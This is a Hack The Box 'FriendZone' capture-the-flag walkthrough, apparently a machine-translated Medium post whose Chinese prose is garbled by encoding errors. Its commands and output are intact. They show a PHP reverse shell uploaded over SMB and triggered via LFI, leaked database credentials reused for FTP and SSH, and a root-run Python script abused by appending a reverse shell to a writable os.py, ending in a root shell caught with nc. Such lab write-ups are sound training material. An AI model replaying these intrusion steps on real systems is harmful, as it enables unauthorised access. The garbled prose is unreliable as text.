src="../Images/aad4bd27656634edfc0218c29fbabc34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mz_2ZH3pI4K48lTq8jPRoA.png"/></div></div></figure><p id="9003" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨å°è¯•è¯†åˆ«LFIçš„æ–¹æ³•åï¼Œæˆ‘æƒ³èµ·æˆ‘ä»¬å¯ä»¥é€šè¿‡SMBä¸Šä¼ æ–‡ä»¶ï¼Œæ–‡ä»¶å…±äº«ä½ç½®æ˜¯/etc/Filesã€‚æ‰€ä»¥ç›´è§‚ä¸Šï¼Œå¯èƒ½æ‰€æœ‰çš„å…±äº«éƒ½éµå¾ª/etc/sharenameæ ¼å¼ã€‚æˆ‘è¯•ç€ä»pentest monkey ä¸Šä¼ phpåå‘shellï¼Œå› ä¸ºwebæœåŠ¡å™¨è¿è¡Œåœ¨phpä¸Šã€‚</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6e67" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup smbclient \\\\10.10.10.123\\Development                                                                                    <br/>Enter WORKGROUP\root's password: <br/>Try "help" to get a list of possible commands.<br/>smb: \&gt; put rev.php <br/>putting file rev.php as \rev.php (8.3 kb/s) (average 8.3 kb/s)<br/>smb: \&gt; dir<br/>  .                                   D        0  Sat Jul 13 01:36:59 2019<br/>  ..                                  D        0  Wed Jan 23 21:51:02 2019<br/>  rev.php                             A     5492  Sat Jul 13 01:37:46 2019<br/>  test                                A        7  Sat Jul 13 00:39:02 2019</span><span id="e51b" class="mg kz iq mc b gy ml mi l mj mk">9221460 blocks of size 1024. 6458420 blocks available</span></pre><p id="cf8c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œæˆ‘è¯•å›¾é€šè¿‡LFIè§¦å‘å®ƒã€‚åœ¨æ— æ•°æ¬¡å°è¯•ä¹‹åï¼ŒLFIåœ¨å“ªé‡Œï¼Œæˆ‘ç»ˆäºå¾—åˆ°äº†æˆ‘çš„å¬ä¼—çš„å›ç”µã€‚çœ‹èµ·æ¥æ—¶é—´æˆ³å‡½æ•°æ˜¯ä¸€ä¸ªphpæ–‡ä»¶ã€‚æˆ‘çš„LFIçš„phpæ‰©å±•è§¦å‘äº†å›è°ƒã€‚</p><p id="8381" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥å¯¹äºLFIæ¥è¯´ï¼Œå®ƒåº”è¯¥æ˜¯:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6e5a" class="mg kz iq mc b gy mh mi l mj mk">pagename=/etc/Development/rev</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi mw"><img src="../Images/82f01e68fd7b01229c44da96646f92f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t2SAWtJOAM28Qa83BgLKWQ.png"/></div></div></figure><p id="394e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è·å–åå‘å¤–å£³:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nh"><img src="../Images/06f216bd9c196c5af77f6cfecb93653d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yRqQbuVPqyeygNwopHr-eQ.png"/></div></div></figure><p id="4ebd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¿®å¤æˆ‘ä»¬çš„å¤–å£³å(æœ‰å¤§é‡çš„å‚è€ƒèµ„æ–™ï¼Œä½ ä¹Ÿå¯ä»¥å‚è€ƒæˆ‘çš„HTB-æ··æ²Œæ–‡ç« )ã€‚</p><p id="edc4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘æ£€æŸ¥äº†æ–‡ä»¶ï¼Œä¸€ä¸ªmysql_data.confè„±é¢–è€Œå‡º:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="d667" class="mg kz iq mc b gy mh mi l mj mk">www-data@FriendZone:/var/www$ cat mysql_data.conf <br/>for development process this is the mysql creds for user friend</span><span id="40d1" class="mg kz iq mc b gy ml mi l mj mk">db_user=<strong class="mc ir">friend</strong></span><span id="65a7" class="mg kz iq mc b gy ml mi l mj mk">db_pass=<strong class="mc ir">Agpyu12!0.213$</strong></span><span id="54f4" class="mg kz iq mc b gy ml mi l mj mk">db_name=FZ</span></pre><p id="1d1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬æ‰¾åˆ°ç”¨æˆ·æœ‹å‹çš„å‡­è¯ã€‚ç”±äºæˆ‘åœ¨FTPä¸­æ²¡æœ‰å·¥ä½œå‡­è¯ï¼Œæ‰€ä»¥æˆ‘åœ¨é‚£é‡Œå°è¯•äº†ä¸€ä¸‹ï¼Œç»“æœæˆåŠŸäº†:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="ae0b" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup ftp 10.10.10.123<br/>Connected to 10.10.10.123.<br/>220 (vsFTPd 3.0.3)<br/>Name (10.10.10.123:root): friend<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/>ftp&gt; ls <br/>200 PORT command successful. Consider using PASV.<br/>150 Here comes the directory listing.<br/>-r--r--r--    1 0        0              33 Oct 06  2018 user.txt<br/>226 Directory send OK.<br/>ftp&gt; get user.txt<br/>local: user.txt remote: user.txt<br/>200 PORT command successful. Consider using PASV.<br/>150 Opening BINARY mode data connection for user.txt (33 bytes).<br/>226 Transfer complete.<br/>33 bytes received in 0.00 secs (388.2719 kB/s)<br/>ftp&gt; exit<br/>221 Goodbye.<br/>âœ  writeup cat user.txt <br/><strong class="mc ir">a9ed20acecd6c5b6b52f474e15ae9a11</strong></span></pre><p id="1f0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘çŸ¥é“æœ‰user.txt .æ£€æŸ¥phpæ–‡ä»¶ï¼ŒéªŒè¯æˆ‘çš„æ¨æµ‹:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi ni"><img src="../Images/88bb366a8bd8f7eb371200a2a72dda78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MESb5BIfuFAIb6_btyWRdA.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">login.php</figcaption></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nj"><img src="../Images/c9e383380411cc1778611e949f3aa74d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5P7-ovhRJXIFbXBYNY5kUw.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">dashboard.php</figcaption></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nk"><img src="../Images/61cdc6283e535c0b408c51890e27a689.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o3q4f1w2ETyIlZwz2Xx9yQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">timestamp.php</figcaption></figure><p id="9dd0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ£€æŸ¥æ›´å¤šæ–‡ä»¶:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="c56c" class="mg kz iq mc b gy mh mi l mj mk">www-data@FriendZone:/var/www$ ls<br/>admin       friendzoneportal       html             uploads<br/>friendzone  friendzoneportaladmin  mysql_data.conf<br/>www-data@FriendZone:/var/www$ cd html<br/>www-data@FriendZone:/var/www/html$ ls<br/>fz.jpg  index.bak  index.html  robots.txt  wordpress<br/>www-data@FriendZone:/var/www/html$ cat robots.txt <br/>seriously ?!<br/>www-data@FriendZone:/var/www/html$ cd wordpress/<br/>www-data@FriendZone:/var/www/html/wordpress$ ls<br/>www-data@FriendZone:/var/www/html/wordpress$ ls -al<br/>total 8<br/>drwxr-xr-x 2 root root 4096 Oct  5  2018 .<br/>drwxr-xr-x 3 root root 4096 Oct  6  2018 ..<br/>www-data@FriendZone:/var/www/html/wordpress$ cd ..<br/>www-data@FriendZone:/var/www/html$ ls<br/>fz.jpg  index.bak  index.html  robots.txt  wordpress<br/>www-data@FriendZone:/var/www/html$ cat index.html <br/>&lt;title&gt;Friend Zone Escape software&lt;/title&gt;</span><span id="cb11" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;Have you ever been friendzoned ?&lt;/h2&gt;&lt;/center&gt;</span><span id="bef7" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;img src="fz.jpg"&gt;&lt;/center&gt;</span><span id="5bce" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;if yes, try to get out of this zone ;)&lt;/h2&gt;&lt;/center&gt;</span><span id="c71c" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;Call us at : +999999999&lt;/h2&gt;&lt;/center&gt;</span><span id="ef32" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;Email us at: info@friendzoneportal.red&lt;/h2&gt;&lt;/center&gt;</span></pre><p id="4e98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰¾ä¸åˆ°ä»»ä½•æœ‰ç”¨çš„ä¸œè¥¿ã€‚æˆ‘æ£€æŸ¥etc/passwdã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nl"><img src="../Images/728c07618871d5826a73a506e453f8ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wI4oFoSBeQOCdSysamJWIw.png"/></div></div></figure><p id="0684" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è½¬åˆ°ç”¨æˆ·æœ‹å‹çš„ä¸»ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥å°†user.txtè¯»ä½œwww-data:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nm"><img src="../Images/7d855a84c1165440b77242849f24233d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0iTVISNPSq9PEDMX6t9-ug.png"/></div></div></figure><p id="5799" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥æœ‰2ç§æ–¹æ³•å¯ä»¥æ£€ç´¢user.txtï¼Œæˆ‘å°è¯•äº†åŒæ ·çš„å‡­è¯(æœ‹å‹:Agpyu12ï¼0.213$)åˆ°ssh:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="f826" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup ssh -l friend 10.10.10.123<br/>friend@10.10.10.123's password:<br/>Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)</span><span id="8f99" class="mg kz iq mc b gy ml mi l mj mk">* Documentation:  <a class="ae kl" href="https://help.ubuntu.com" rel="noopener ugc nofollow" target="_blank">https://help.ubuntu.com</a><br/> * Management:     <a class="ae kl" href="https://landscape.canonical.com" rel="noopener ugc nofollow" target="_blank">https://landscape.canonical.com</a><br/> * Support:        <a class="ae kl" href="https://ubuntu.com/advantage" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/advantage</a></span><span id="3d21" class="mg kz iq mc b gy ml mi l mj mk">You have mail.<br/>Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3<br/>friend@FriendZone:~$</span></pre><h1 id="5443" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">è·å–æ ¹ç›®å½•:</h1><p id="d569" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æˆ‘é¦–å…ˆè¿è¡Œä¸€ä¸ªæŸ¥æ‰¾SUIDæ–‡ä»¶çš„findå‘½ä»¤ï¼Œå°†stderroré‡å®šå‘åˆ°/dev/nullï¼Œå› ä¸ºæœ‰è®¸å¤šæ–‡ä»¶ä¸æ˜¯SUIDæ–‡ä»¶(ä¸ºäº†é¿å…æ‚¨çš„ç»ˆç«¯å‡ºç°å¤§é‡é”™è¯¯):</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="2b81" class="mg kz iq mc b gy mh mi l mj mk"><strong class="mc ir">find / -perm -4000 2&gt;/dev/null</strong></span></pre><p id="ed16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºä¸­æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="0067" class="mg kz iq mc b gy mh mi l mj mk">/bin/fusermount                                                                                                                                                               <br/>/bin/umount                                                                                                                                                                   <br/>/bin/mount                                                                                                                                                                    <br/>/bin/su                                                                                                                                                                       <br/>/bin/ntfs-3g                                                                                                                                                                  <br/>/bin/ping                                                                                                                                                                     <br/>/usr/bin/passwd                                                                                                                                                               <br/>/usr/bin/traceroute6.iputils                                                                                                                                                  <br/>/usr/bin/newgrp                                                                                                                                                               <br/>/usr/bin/sudo                                                                                                                                                                 <br/>/usr/bin/gpasswd                                                                                                                                                              <br/>/usr/bin/chsh                                                                                                                                                                 <br/>/usr/bin/chfn                                                                                                                                                                 <br/>/usr/sbin/exim4                                                                                                                                                               <br/>/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                   <br/>/usr/lib/eject/dmcrypt-get-device                                                                                                                                             <br/>/usr/lib/openssh/ssh-keysign</span></pre><p id="94c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ã€‚æˆ‘æ£€æŸ¥ä»»ä½•äººéƒ½å¯ä»¥å†™çš„ç›®å½•ï¼Œå°†é”™è¯¯é‡å®šå‘åˆ°/dev/null:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="570a" class="mg kz iq mc b gy mh mi l mj mk"><strong class="mc ir">find / -perm -222 -type d 2&gt;/dev/null</strong></span></pre><p id="69ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘é€šè¿‡SMB(/etc/Development)å’Œ/usr/lib/python2.7æ‰¾åˆ°äº†æˆ‘ä»¬ä¸Šä¼ shellçš„ä½ç½®:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="bd81" class="mg kz iq mc b gy mh mi l mj mk">/etc/sambafiles<br/>/etc/Development<br/>/var/spool/samba<br/>/var/tmp<br/>/var/lib/php/sessions<br/>/tmp<br/>/tmp/.Test-unix<br/>/tmp/.ICE-unix<br/>/tmp/.font-unix<br/>/tmp/.X11-unix<br/>/tmp/.XIM-unix<br/>/run/lock<br/>/usr/lib/python2.7<br/>/dev/mqueue<br/>/dev/shm</span></pre><p id="3266" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘æŸ¥çœ‹äº†ç›®å½•/usr/lib/python2.7å¹¶æ£€æŸ¥äº†æ„Ÿå…´è¶£çš„æ–‡ä»¶ï¼Œå‘ç°os.pyæ‹¥æœ‰777æƒé™ï¼Œå¹¶ä¸”ä»¥<strong class="jp ir"> ROOT </strong>èº«ä»½è¿è¡Œ:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nn"><img src="../Images/401821a1c460bf2f9326f7673c674e4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ExsleSBOHrNPDAixspixNw.png"/></div></div></figure><p id="888d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è¿˜è¿è¡Œäº†<a class="ae kl" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank"> pspy </a>ï¼Œå®ƒåœ¨CTFs/HTBæœºå™¨ä¸Šéå¸¸æœ‰ç”¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œè®¾è®¡ç”¨æ¥çª¥æ¢è¿›ç¨‹ï¼Œä¸éœ€è¦rootæƒé™ã€‚å®ƒå…è®¸æ‚¨æŸ¥çœ‹å…¶ä»–ç”¨æˆ·è¿è¡Œçš„å‘½ä»¤ã€cronä½œä¸šç­‰ã€‚å½“ä»–ä»¬æ‰§è¡Œçš„æ—¶å€™ã€‚è®©å®ƒè¿è¡Œï¼Œæˆ‘çœ‹åˆ°reporter.pyæ¯éš”ä¸€æ®µæ—¶é—´æ‰§è¡Œä¸€æ¬¡:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/5ddc7e683757cd1df3a4eac51c7a2a15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/1*tBkjgfvleN3TT-YwTrK5vw.png"/></div></figure><p id="7f54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">server_adminç›®å½•éå¸¸çªå‡ºï¼Œå› ä¸ºæˆ‘å¯ä»¥ä»é‚£é‡Œè¯»å–æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘è¯»å–äº†reporter.py:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="113c" class="mg kz iq mc b gy mh mi l mj mk">friend@FriendZone:/opt/server_admin$ cat reporter.py <br/>#!/usr/bin/python</span><span id="b82d" class="mg kz iq mc b gy ml mi l mj mk">import os</span><span id="2022" class="mg kz iq mc b gy ml mi l mj mk">to_address = "<a class="ae kl" href="mailto:admin1@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin1@friendzone.com</a>"<br/>from_address = "<a class="ae kl" href="mailto:admin2@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin2@friendzone.com</a>"</span><span id="b676" class="mg kz iq mc b gy ml mi l mj mk">print "[+] Trying to send email to %s"%to_address</span><span id="f4f2" class="mg kz iq mc b gy ml mi l mj mk">#command = ''' mailsend -to <a class="ae kl" href="mailto:admin2@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin2@friendzone.com</a> -from <a class="ae kl" href="mailto:admin1@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin1@friendzone.com</a> -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span><span id="5b0b" class="mg kz iq mc b gy ml mi l mj mk">#os.system(command)</span><span id="8773" class="mg kz iq mc b gy ml mi l mj mk"># I need to edit the script later<br/># Sam ~ python developer</span></pre><p id="5f70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥pythonè„šæœ¬è¿˜æ²¡æœ‰å®Œæˆï¼Œä½†æ˜¯å®ƒè°ƒç”¨äº†osåº“ï¼Œå°±åƒæˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„é‚£æ ·ï¼Œå®ƒä»¥rootèº«ä»½è¿è¡Œã€‚ç°åœ¨ï¼Œæˆ‘åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹æˆ‘å¦‚ä½•æ‰èƒ½åšåˆ°è¿™ä¸€ç‚¹ï¼Œå‘ç°è¿™äº›å¾ˆæœ‰å¸®åŠ©:</p><h2 id="70fc" class="mg kz iq bd la np nq dn le nr ns dp li jy nt nu lm kc nv nw lq kg nx ny lu nz bi translated">æ¥è°ˆè°ˆæ¥è‡ªSANSçš„Mark Baggettçš„é»‘æš—é¢(è¿™å®¶ä¼™çš„Pythonå¤ªæ£’äº†)</h2><p id="ffa2" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated"><a class="ae kl" href="https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1542133788.pdf" rel="noopener ugc nofollow" target="_blank">https://www . sans . org/cyber-security-summit/archives/file/summit-archive-1542133788 . pdf</a></p><h2 id="6a12" class="mg kz iq bd la np nq dn le nr ns dp li jy nt nu lm kc nv nw lq kg nx ny lu nz bi translated">é€šè¿‡ä»å…‰æ …åŒ–åŠ«æŒPythonåº“æ¥æå‡æƒé™</h2><div class="oa ob gp gr oc od"><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/" rel="noopener  ugc nofollow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd ir gy z fp oi fr fs oj fu fw ip bi translated">é€šè¿‡Pythonåº“åŠ«æŒ| rastating.github.ioæå‡æƒé™</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">ä»Šå¤©åœ¨è°ƒè¯•ä¸€ä¸ªPythonè„šæœ¬æ—¶ï¼Œæˆ‘å‘ç°æˆ‘æ— æ³•æ‰§è¡Œå®ƒï¼Œå †æ ˆè·Ÿè¸ªæŒ‡å‘â€¦</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">rastating.github.io</p></div></div><div class="om l"><div class="on l oo op oq om or ks od"/></div></div></a></div><p id="51a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åï¼Œæˆ‘æ£€æŸ¥äº†æŸ¥æ‰¾åº“çš„æœç´¢è¿‡ç¨‹çš„â€œä¼˜å…ˆçº§â€:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6081" class="mg kz iq mc b gy mh mi l mj mk">friend@FriendZone:/tmp$ python -c 'import sys; print "\n".join(sys.path)'</span><span id="4c1f" class="mg kz iq mc b gy ml mi l mj mk">/usr/lib/python2.7<br/>/usr/lib/python2.7/plat-x86_64-linux-gnu<br/>/usr/lib/python2.7/lib-tk<br/>/usr/lib/python2.7/lib-old<br/>/usr/lib/python2.7/lib-dynload<br/>/usr/local/lib/python2.7/dist-packages<br/>/usr/lib/python2.7/dist-packages</span></pre><p id="5833" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å³ä½¿æˆ‘ä»¬ä¸èƒ½åœ¨è„šæœ¬è¿è¡Œçš„å½“å‰ç›®å½•ä¸Šå†™å…¥(è¿™æ˜¯ä¼˜å…ˆçº§ï¼Œå¹¶ä¸”é‚£é‡Œæ²¡æœ‰os.py)ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨/usr/lib/python2.7ä¸Šå†™å…¥(ç¬¬äºŒä¸ªé€‰é¡¹)ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥åœ¨os.pyä¸Šè¿›è¡Œæ›´æ”¹ï¼Œå› ä¸ºå®ƒå°†è¢«è¿è¡Œçš„reporter.pyè°ƒç”¨ã€‚</p><p id="e518" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘åœ¨os.pyè„šæœ¬çš„åº•éƒ¨æ·»åŠ äº†ä¸€ä¸ªåå‘shellè„šæœ¬:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi os"><img src="../Images/881bb972c8f8424cf5bb041184d02f0d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m-3aXhXpIIBbPARByOcKrA.png"/></div></div></figure><p id="0372" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">çœ‹åˆ°å®ƒä»pspy64è§¦å‘:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/bbbc74b2aee4873adaf4e24c94593a0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1026/format:webp/1*xAbh0AMFXQrRsp1mSH4USg.png"/></div></figure><p id="7627" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘å¾—åˆ°æˆ‘çš„å£³ä½œä¸ºæ ¹ã€‚</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="b7ae" class="mg kz iq mc b gy mh mi l mj mk">âœ  writeup nc -nlvp 9003<br/>listening on [any] 9003 ...<br/>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.123] 52620<br/>/bin/sh: 0: can't access tty; job control turned off<br/># id<br/>uid=0(root) gid=0(root) groups=0(root)<br/># cat /root/root.txt<br/><strong class="mc ir">b0e6c60b82cf96e9855ac1656a9e90c7</strong></span></pre><p id="cce3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘æ‰¾åˆ°äº†ä¸€äº›è¯ä¹¦æ–‡ä»¶ï¼Œä½†æ²¡æœ‰æ·±å…¥åˆ°æˆ‘å¯ä»¥ä½¿ç”¨å®ƒä»¬çš„åœ°æ–¹ã€‚å› ä¸ºæˆ‘ä¸çŸ¥é“é’¥åŒ™çš„å¯†ç ã€‚è‹±é›„è”ç›Ÿ</p><p id="7a60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™å°±æ˜¯æˆ‘å¦‚ä½•ç ´è§£Friendzoneçš„ã€‚æˆ‘å¸Œæœ›ä½ èƒ½ä»è¿™æ¬¡æ¼”ç»ƒä¸­å­¦åˆ°ä¸€äº›ä¸œè¥¿ã€‚å¹²æ¯ï¼ğŸº</p></div><div class="ab cl ou ov hu ow" role="separator"><span class="ox bw bk oy oz pa"/><span class="ox bw bk oy oz pa"/><span class="ox bw bk oy oz"/></div><div class="ij ik il im in"><p id="0e2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="pb">å…³æ³¨</em> <a class="ae kl" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="pb"> InfosecæŠ¥é“</em> </a> <em class="pb">è·å–æ›´å¤šæ­¤ç±»ç²¾å½©æŠ¥é“ã€‚</em></p><div class="oa ob gp gr oc od"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd ir gy z fp oi fr fs oj fu fw ip bi translated">ä¿¡æ¯å®‰å…¨æŠ¥é“</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">æ”¶é›†äº†ä¸–ç•Œä¸Šæœ€å¥½çš„é»‘å®¢çš„æ–‡ç« ï¼Œä¸»é¢˜ä»bugå¥–é‡‘å’ŒCTFåˆ°vulnhubâ€¦</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">medium.com</p></div></div><div class="om l"><div class="pc l oo op oq om or ks od"/></div></div></a></div></div></div>    
</body>
</html>